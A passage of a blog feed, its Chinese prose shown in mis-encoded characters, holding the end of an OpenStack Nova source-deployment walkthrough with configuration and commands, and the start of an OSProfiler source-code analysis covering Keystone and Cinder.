class="number">5000</span>/</span><br><span class="line"><span class="attr">auth_type</span> = password</span><br><span class="line"><span class="attr">project_domain_name</span> = Default</span><br><span class="line"><span class="attr">user_domain_name</span> = Default</span><br><span class="line"><span class="attr">project_name</span> = service</span><br><span class="line"><span class="attr">username</span> = nova</span><br><span class="line"><span class="attr">password</span> = nova</span><br><span class="line"><span class="comment">#memcached_servers = 127.0.0.1:11211</span></span><br><span class="line"></span><br><span class="line"><span class="section">[vnc]</span></span><br><span class="line"><span class="attr">enabled</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">server_listen</span> = <span class="variable">$my_ip</span></span><br><span class="line"><span class="attr">server_proxyclient_address</span> = <span class="variable">$my_ip</span></span><br><span class="line"><span class="attr">novncproxy_base_url</span> = http://controller:<span class="number">6080</span>/vnc_auto.html</span><br><span class="line"></span><br><span class="line"><span class="section">[glance]</span></span><br><span class="line"><span class="attr">api_servers</span> = http://controller:<span class="number">9292</span></span><br><span class="line"></span><br><span class="line"><span class="section">[oslo_concurrency]</span></span><br><span class="line"><span class="attr">lock_path</span> = /var/lib/nova/tmp</span><br><span class="line"></span><br><span class="line"><span class="section">[placement]</span></span><br><span class="line"><span class="attr">region_name</span> = RegionOne</span><br><span class="line"><span class="attr">project_domain_name</span> = Default</span><br><span class="line"><span class="attr">project_name</span> = service</span><br><span class="line"><span class="attr">auth_type</span> = password</span><br><span class="line"><span class="attr">user_domain_name</span> = Default</span><br><span class="line"><span class="attr">auth_url</span> = http://controller:<span class="number">5000</span>/v3</span><br><span class="line"><span class="attr">username</span> = placement</span><br><span class="line"><span class="attr">password</span> = placement</span><br></pre></td></tr></table></figure><p>å¯ç”¨æœåŠ¡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># novnc</span></span><br><span class="line">sudo git <span class="built_in">clone</span> https://github.com/novnc/noVNC.git /usr/share/novnc/</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¡«å……æ•°æ®åº“</span></span><br><span class="line"><span class="comment">#.tox/shared/bin/pip3 install opentracing</span></span><br><span class="line">.tox/shared/bin/nova-manage --config-file /etc/nova/nova.conf api_db sync</span><br><span class="line">.tox/shared/bin/nova-manage --config-file /etc/nova/nova.conf cell_v2 map_cell0</span><br><span class="line">.tox/shared/bin/nova-manage --config-file /etc/nova/nova.conf cell_v2 create_cell --name=cell1 --verbose</span><br><span class="line">.tox/shared/bin/nova-manage --config-file /etc/nova/nova.conf db sync</span><br><span class="line">.tox/shared/bin/nova-manage --config-file /etc/nova/nova.conf cell_v2 list_cells</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯åŠ¨æœåŠ¡ nova-apiã€nova-schedulerã€nova-conductor</span></span><br><span class="line">sudo nova-api --config-file=/etc/nova/nova.conf --config-file=/etc/nova/api-paste.ini --debug</span><br><span class="line">sudo nova-scheduler --config-file=/etc/nova/nova.conf --debug</span><br><span class="line">sudo nova-conductor --config-file=/etc/nova/nova.conf --debug</span><br><span class="line"><span class="comment"># sudo nova-novncproxy --config-file=/etc/nova/nova.conf --debug</span></span><br></pre></td></tr></table></figure><p>éªŒè¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">. admin-openrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ—å‡ºè®¡ç®—æœåŠ¡</span></span><br><span class="line">openstack compute service list</span><br><span class="line"></span><br><span class="line"><span class="comment"># API çŠ¶æ€</span></span><br><span class="line">nova-status upgrade check</span><br></pre></td></tr></table></figure><h1 id="è®¡ç®—èŠ‚ç‚¹"><a href="#è®¡ç®—èŠ‚ç‚¹" class="headerlink" title="è®¡ç®—èŠ‚ç‚¹"></a>è®¡ç®—èŠ‚ç‚¹</h1><p>PSï¼šè¿™é‡Œè¿ mysql éƒ½è£…äº†ï¼Œå…¶å®æ²¡å¿…è¦ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä¸‹è½½æºç </span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/nova.git --branch stable/victoria --single-branch</span><br><span class="line"><span class="built_in">cd</span> nova</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£…ä¾èµ–</span></span><br><span class="line">pip install bindep</span><br><span class="line">sudo apt install $(bindep -b) -y</span><br><span class="line"></span><br><span class="line">pip install -r requirements.txt</span><br><span class="line"><span class="comment"># sudo apt-get install libpq-dev</span></span><br><span class="line">pip install -r test-requirements.txt</span><br><span class="line"><span class="comment"># pip install -e .</span></span><br><span class="line">pip install tox</span><br><span class="line"><span class="comment"># git init</span></span><br><span class="line">tox -e genconfig</span><br><span class="line"></span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure><p>ç¼–è¾‘é…ç½®æ–‡ä»¶ /etc/nova/nova.conf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºæ–‡ä»¶å¤¹</span></span><br><span class="line">sudo mkdir /etc/nova</span><br><span class="line"><span class="comment">#sudo mkdir /var/lib/nova/tmp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‹·è´é…ç½®æ–‡ä»¶</span></span><br><span class="line">sudo cp etc/nova/nova.conf.sample /etc/nova/nova.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹</span></span><br><span class="line">sudo vim /etc/nova/nova.conf</span><br></pre></td></tr></table></figure><p>é…ç½®å¦‚ä¸‹ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[DEFAULT]</span></span><br><span class="line"><span class="attr">transport_url</span> = rabbit://openstack:RABBIT_PASS@controller</span><br><span class="line"><span class="attr">my_ip</span> = <span class="number">10.0</span>.<span class="number">2.29</span></span><br><span class="line"><span class="attr">compute_driver</span>=libvirt.LibvirtDriver</span><br><span class="line"><span class="comment">#firewall_driver = nova.virt.firewall.NoopFirewallDriver</span></span><br><span class="line"></span><br><span class="line"><span class="section">[api]</span></span><br><span class="line"><span class="attr">auth_strategy</span> = keystone</span><br><span class="line"></span><br><span class="line"><span class="section">[keystone_authtoken]</span></span><br><span class="line"><span class="attr">www_authenticate_uri</span> = http://controller:<span class="number">5000</span>/</span><br><span class="line"><span class="attr">auth_url</span> = http://controller:<span class="number">5000</span>/</span><br><span class="line"><span class="attr">auth_type</span> = password</span><br><span class="line"><span class="attr">project_domain_name</span> = Default</span><br><span class="line"><span class="attr">user_domain_name</span> = Default</span><br><span class="line"><span class="attr">project_name</span> = service</span><br><span class="line"><span class="attr">username</span> = nova</span><br><span class="line"><span class="attr">password</span> = nova</span><br><span class="line"><span class="comment">#memcached_servers = controller:11211</span></span><br><span class="line"></span><br><span class="line"><span class="section">[vnc]</span></span><br><span class="line"><span class="attr">enabled</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">server_listen</span> = <span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"><span class="attr">server_proxyclient_address</span> = <span class="variable">$my_ip</span></span><br><span class="line"><span class="attr">novncproxy_base_url</span> = http://controller:<span class="number">6080</span>/vnc_auto.html</span><br><span class="line"></span><br><span class="line"><span class="section">[glance]</span></span><br><span class="line"><span class="attr">api_servers</span> = http://controller:<span class="number">9292</span></span><br><span class="line"></span><br><span class="line"><span class="section">[oslo_concurrency]</span></span><br><span class="line"><span class="attr">lock_path</span> = /var/lib/nova/tmp</span><br><span class="line"></span><br><span class="line"><span class="section">[placement]</span></span><br><span class="line"><span class="attr">region_name</span> = RegionOne</span><br><span class="line"><span class="attr">project_domain_name</span> = Default</span><br><span class="line"><span class="attr">project_name</span> = service</span><br><span class="line"><span class="attr">auth_type</span> = password</span><br><span class="line"><span class="attr">user_domain_name</span> = Default</span><br><span class="line"><span class="attr">auth_url</span> = http://controller:<span class="number">5000</span>/v3</span><br><span class="line"><span class="attr">username</span> = placement</span><br><span class="line"><span class="attr">password</span> = placement</span><br><span class="line"></span><br><span class="line"><span class="section">[libvirt]</span></span><br><span class="line"><span class="attr">virt_type</span> = qemu</span><br></pre></td></tr></table></figure><p>è®¡ç®—ä¸»æœºæœ¬èº«ä¸æ”¯æŒè™šæ‹ŸåŒ–ï¼ŒæŒ‰ç…§å®˜æ–¹æ•™ç¨‹åº”è¯¥é…ç½® <code>virt_type=qemu</code> ï¼Œä½†æç¤ºéœ€è¦é…ç½® <code>compute_driver</code> æŸ¥é˜… <a href="https://docs.openstack.org//nova/latest/doc-nova.pdf">nova æ–‡æ¡£</a>ï¼ˆp322ï¼‰æ‰¾åˆ°æ”¯æŒçš„è™šæ‹ŸåŒ–é©±åŠ¨</p><ul><li>libvirt.LibvirtDriver</li><li>ironic.IronicDriver</li><li>vmwareapi.VMwareVCDriver</li><li>hyperv.HyperVDriver</li><li>powervm.PowerVMDriver</li><li>zvm.ZVMDriver</li><li>fake.FakeDriver</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å®‰è£… libvirt</span></span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install qemu-kvm libvirt-daemon-system -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥è¯¢ç‰ˆæœ¬</span></span><br><span class="line">virsh</span><br><span class="line">version</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯ç”¨æœåŠ¡</span></span><br><span class="line">sudo nova-compute --config-file=/etc/nova/nova.conf --debug</span><br></pre></td></tr></table></figure><h2 id="æ§åˆ¶èŠ‚ç‚¹-1"><a href="#æ§åˆ¶èŠ‚ç‚¹-1" class="headerlink" title="æ§åˆ¶èŠ‚ç‚¹"></a>æ§åˆ¶èŠ‚ç‚¹</h2><p>æ·»åŠ åˆ° cell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># èº«ä»½è®¤è¯</span></span><br><span class="line">. admin-openrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¡®è®¤è®¡ç®—èŠ‚ç‚¹</span></span><br><span class="line">openstack compute service list --service nova-compute</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‘ç°è®¡ç®—èŠ‚ç‚¹</span></span><br><span class="line"><span class="comment">#su -s /bin/sh -c &quot;nova-manage cell_v2 discover_hosts --verbose&quot; nova</span></span><br><span class="line">~/nova/.tox/shared/bin/nova-manage --config-file /etc/nova/nova.conf cell_v2 discover_hosts --verbose</span><br></pre></td></tr></table></figure><p>éªŒè¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ—å‡ºè®¡ç®—æœåŠ¡</span></span><br><span class="line">openstack compute service list</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ—å‡ºé•œåƒæœåŠ¡ä¸­çš„é•œåƒï¼ŒéªŒè¯å’Œé•œåƒæœåŠ¡çš„è¿æ¥</span></span><br><span class="line">openstack image list</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ£€æŸ¥ cells å’Œ placement API æ˜¯å¦æˆåŠŸè¿è¡Œ</span></span><br><span class="line">nova-status upgrade check</span><br></pre></td></tr></table></figure><h1 id="å‚é˜…"><a href="#å‚é˜…" class="headerlink" title="å‚é˜…"></a>å‚é˜…</h1><ul><li><a href="https://askubuntu.com/questions/984445/netplan-configuration-on-ubuntu-17-04-virtual-machine">netplan configuration on Ubuntu 17.04 virtual machine</a></li><li><a href="https://www.digitalocean.com/community/tutorials/how-to-allow-remote-access-to-mysql">How To Allow Remote Access to MySQL</a></li></ul>]]></content>
    
    
    <summary type="html">è®°å½•éƒ¨ç½²æµç¨‹</summary>
    
    
    
    <category term="OpenStack" scheme="https://jckling.github.io/categories/OpenStack/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
    <category term="Ubuntu" scheme="https://jckling.github.io/tags/Ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>OSProfiler æºç åˆ†æ</title>
    <link href="https://jckling.github.io/2021/05/25/OpenStack/OSProfiler%20%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>https://jckling.github.io/2021/05/25/OpenStack/OSProfiler%20%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2021-05-25T05:55:52.000Z</published>
    <updated>2021-10-11T13:39:04.665Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ”¯æŒ-OSProfiler-çš„æ ¸å¿ƒç»„ä»¶"><a href="#æ”¯æŒ-OSProfiler-çš„æ ¸å¿ƒç»„ä»¶" class="headerlink" title="æ”¯æŒ OSProfiler çš„æ ¸å¿ƒç»„ä»¶"></a>æ”¯æŒ OSProfiler çš„æ ¸å¿ƒç»„ä»¶</h1><p>OSProfiler æ”¯æŒçš„ç»„ä»¶çš„èµ·å§‹ç‰ˆæœ¬ï¼Œ6 ä¸ªæ ¸å¿ƒç»„ä»¶</p><table><thead><tr><th>ç»„ä»¶</th><th>ç‰ˆæœ¬</th></tr></thead><tbody><tr><td>Keystone</td><td><a href="https://docs.openstack.org/releasenotes/keystone/newton.html">Newton</a></td></tr><tr><td>Glance</td><td><a href="https://docs.openstack.org/performance-docs/latest/test_plans/keystone/plan.html">Juno</a></td></tr><tr><td>Nova</td><td><a href="https://docs.openstack.org/releasenotes/nova/ocata.html">Ocata</a></td></tr><tr><td>Neutron</td><td><a href="https://docs.openstack.org/releasenotes/neutron/newton.html">Newton</a></td></tr><tr><td>Swift</td><td><a href="https://blueprints.launchpad.net/swift/+spec/osprofiler-support-in-swift">Blueprint Not started</a></td></tr><tr><td>Cinder</td><td><a href="https://docs.openstack.org/performance-docs/latest/test_plans/keystone/plan.html">Juno</a></td></tr></tbody></table><p>ä» 3.0.0 ç‰ˆæœ¬å¼€å§‹ OSProfiler å¼ƒç”¨ Python2 æ”¯æŒï¼Œè‡³å°‘å¾—ä½¿ç”¨ Python3.6 ã€‚æ¯ä¸ª OpenStack éƒ½æœ‰å¯¹åº”çš„ç¨³å®šç‰ˆ OSProfiler ï¼Œä¸»è¦ç”¨äºæ€§èƒ½æµ‹è¯•ã€‚</p><img src="https://i.loli.net/2021/06/06/g34prsFtyhVnS5Y.png" width="60%"><h2 id="Keystone"><a href="#Keystone" class="headerlink" title="Keystone"></a>Keystone</h2><p>ç›¸å…³æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">keystone/conf/__init__.py      <span class="comment"># è®¾ç½®é»˜è®¤é…ç½®</span></span><br><span class="line">keystone/common/profiler.py    <span class="comment"># è¯»å–é…ç½®æ–‡ä»¶ï¼Œè®¾ç½®é€šçŸ¥é©±åŠ¨ï¼Œå¯ç”¨ä¸­é—´ä»¶</span></span><br><span class="line">keystone/common/sql/core.py    <span class="comment"># åŒ…è£…æ•°æ®åº“ä¼šè¯</span></span><br><span class="line">keystone/server/flask/core.py  <span class="comment"># åˆå§‹åŒ–ï¼Œè°ƒç”¨ common/profiler.py</span></span><br><span class="line">setup.cfg                      <span class="comment"># è®¾ç½®ä¸­é—´ä»¶ WsgiMiddleware</span></span><br></pre></td></tr></table></figure><p><code>keystone/conf/__init__.py</code> è®¾ç½® OSProfiler é»˜è®¤é…ç½®ï¼Œä¸å¯ç”¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_external_opts_defaults</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Update default configuration options for oslo.middleware.&quot;&quot;&quot;</span></span><br><span class="line">    cors.set_defaults(</span><br><span class="line">        allow_headers=[<span class="string">&#x27;X-Auth-Token&#x27;</span>,</span><br><span class="line">                       <span class="string">&#x27;X-Openstack-Request-Id&#x27;</span>,</span><br><span class="line">                       <span class="string">&#x27;X-Subject-Token&#x27;</span>,</span><br><span class="line">                       <span class="string">&#x27;X-Project-Id&#x27;</span>,</span><br><span class="line">                       <span class="string">&#x27;X-Project-Name&#x27;</span>,</span><br><span class="line">                       <span class="string">&#x27;X-Project-Domain-Id&#x27;</span>,</span><br><span class="line">                       <span class="string">&#x27;X-Project-Domain-Name&#x27;</span>,</span><br><span class="line">                       <span class="string">&#x27;X-Domain-Id&#x27;</span>,</span><br><span class="line">                       <span class="string">&#x27;X-Domain-Name&#x27;</span>,</span><br><span class="line">                       <span class="string">&#x27;Openstack-Auth-Receipt&#x27;</span>],</span><br><span class="line">        expose_headers=[<span class="string">&#x27;X-Auth-Token&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;X-Openstack-Request-Id&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;X-Subject-Token&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;Openstack-Auth-Receipt&#x27;</span>],</span><br><span class="line">        allow_methods=[<span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">                       <span class="string">&#x27;PUT&#x27;</span>,</span><br><span class="line">                       <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                       <span class="string">&#x27;DELETE&#x27;</span>,</span><br><span class="line">                       <span class="string">&#x27;PATCH&#x27;</span>]</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># configure OSprofiler options</span></span><br><span class="line">    profiler.set_defaults(CONF, enabled=<span class="literal">False</span>, trace_sqlalchemy=<span class="literal">False</span>)          <span class="comment"># è®¾ç½® OSProfiler é»˜è®¤é…ç½®</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p><code>keystone/common/profiler.py</code> è¯»å–é…ç½®æ–‡ä»¶å¯ç”¨ OSProfiler ï¼Œè®¾ç½®é©±åŠ¨ï¼Œæ·»åŠ æ—¥å¿—ä¿¡æ¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span>(<span class="params">name, host=<span class="string">&#x27;0.0.0.0&#x27;</span></span>):</span>  <span class="comment"># nosec</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Setup OSprofiler notifier and enable profiling.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param name: name of the service that will be profiled</span></span><br><span class="line"><span class="string">    :param host: hostname or host IP address that the service will be</span></span><br><span class="line"><span class="string">                 running on. By default host will be set to 0.0.0.0, but more</span></span><br><span class="line"><span class="string">                 specified host name / address usage is highly recommended.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> CONF.profiler.enabled:</span><br><span class="line">        osprofiler.initializer.init_from_conf(</span><br><span class="line">            conf=CONF,</span><br><span class="line">            context=&#123;&#125;,</span><br><span class="line">            project=<span class="string">&quot;keystone&quot;</span>,</span><br><span class="line">            service=name,</span><br><span class="line">            host=host</span><br><span class="line">        )</span><br><span class="line">        LOG.info(<span class="string">&quot;OSProfiler is enabled.\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;Traces provided from the profiler &quot;</span></span><br><span class="line">                 <span class="string">&quot;can only be subscribed to using the same HMAC keys that &quot;</span></span><br><span class="line">                 <span class="string">&quot;are configured in Keystone&#x27;s configuration file &quot;</span></span><br><span class="line">                 <span class="string">&quot;under the [profiler] section. \n To disable OSprofiler &quot;</span></span><br><span class="line">                 <span class="string">&quot;set in /etc/keystone/keystone.conf:\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;[profiler]\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;enabled=false&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>setup.cfg</code> è®¾ç½® server ä¸­é—´ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">keystone.server_middleware &#x3D;</span><br><span class="line">    cors &#x3D; oslo_middleware:CORS</span><br><span class="line">    sizelimit &#x3D; oslo_middleware:RequestBodySizeLimiter</span><br><span class="line">    http_proxy_to_wsgi &#x3D; oslo_middleware:HTTPProxyToWSGI</span><br><span class="line">    osprofiler &#x3D; osprofiler.web:WsgiMiddleware          &lt;--- ä½¿ç”¨ osprofiler çš„ WSGI ä¸­é—´ä»¶</span><br><span class="line">    request_id &#x3D; oslo_middleware:RequestId</span><br><span class="line">    debug &#x3D; oslo_middleware:Debug</span><br></pre></td></tr></table></figure><p><code>keystone/server/flask/core.py</code> æœåŠ¡å™¨ä¸­é—´ä»¶æŒ‰ä»¥ä¸‹é¡ºåºå¤„ç†è¯·æ±‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># NOTE(morgan): ORDER HERE IS IMPORTANT! The middleware will process the</span></span><br><span class="line"><span class="comment"># request in this list&#x27;s order.</span></span><br><span class="line">_APP_MIDDLEWARE = (</span><br><span class="line">    _Middleware(namespace=<span class="string">&#x27;keystone.server_middleware&#x27;</span>,</span><br><span class="line">                ep=<span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">                conf=&#123;<span class="string">&#x27;oslo_config_project&#x27;</span>: <span class="string">&#x27;keystone&#x27;</span>&#125;),</span><br><span class="line">    _Middleware(namespace=<span class="string">&#x27;keystone.server_middleware&#x27;</span>,</span><br><span class="line">                ep=<span class="string">&#x27;sizelimit&#x27;</span>,</span><br><span class="line">                conf=&#123;&#125;),</span><br><span class="line">    _Middleware(namespace=<span class="string">&#x27;keystone.server_middleware&#x27;</span>,</span><br><span class="line">                ep=<span class="string">&#x27;http_proxy_to_wsgi&#x27;</span>,</span><br><span class="line">                conf=&#123;&#125;),</span><br><span class="line">    _Middleware(namespace=<span class="string">&#x27;keystone.server_middleware&#x27;</span>,     <span class="comment"># OSProfiler æä¾›çš„ WSGI ä¸­é—´ä»¶</span></span><br><span class="line">                ep=<span class="string">&#x27;osprofiler&#x27;</span>,</span><br><span class="line">                conf=&#123;&#125;),</span><br><span class="line">    _Middleware(namespace=<span class="string">&#x27;keystone.server_middleware&#x27;</span>,</span><br><span class="line">                ep=<span class="string">&#x27;request_id&#x27;</span>,</span><br><span class="line">                conf=&#123;&#125;),</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><code>keystone/common/sql/core.py</code> åŒ…è£…æ•°æ®åº“å¼•æ“ä¼šè¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨ osprofiler æ¨¡å—åŒ…è£…ä¼šè¯</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_wrap_session</span>(<span class="params">sess</span>):</span></span><br><span class="line">    <span class="keyword">if</span> CONF.profiler.enabled <span class="keyword">and</span> CONF.profiler.trace_sqlalchemy:</span><br><span class="line">        sess = osprofiler.sqlalchemy.wrap_session(sql, sess)</span><br><span class="line">    <span class="keyword">return</span> sess</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¯»</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">session_for_read</span>():</span></span><br><span class="line">    <span class="keyword">if</span> _TESTING_USE_GLOBAL_CONTEXT_MANAGER:</span><br><span class="line">        reader = enginefacade.reader</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        reader = _get_main_context_manager().reader</span><br><span class="line">    <span class="keyword">return</span> _wrap_session(reader.using(_get_context()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># å†™</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">session_for_write</span>():</span></span><br><span class="line">    <span class="keyword">if</span> _TESTING_USE_GLOBAL_CONTEXT_MANAGER:</span><br><span class="line">        writer = enginefacade.writer</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        writer = _get_main_context_manager().writer</span><br><span class="line">    <span class="keyword">return</span> _wrap_session(writer.using(_get_context()))</span><br></pre></td></tr></table></figure><h2 id="Cinder"><a href="#Cinder" class="headerlink" title="Cinder"></a>Cinder</h2><p>ç›¸å…³æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cinder/db/sqlalchemy/api.py     <span class="comment"># æ·»åŠ æ•°æ®åº“è¿½è¸ª</span></span><br><span class="line">cinder/rpc.py                   <span class="comment"># ä¸Šä¸‹æ–‡åºåˆ—åŒ–/ååºåˆ—åŒ–</span></span><br><span class="line">cinder/service.py               <span class="comment"># å¯ç”¨ OSProfilerï¼›æ·»åŠ  RPC è¿½è¸ª</span></span><br></pre></td></tr></table></figure><p><code>cinder/db/sqlalchemy/api.py</code> æ·»åŠ æ•°æ®åº“è¿½è¸ª</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 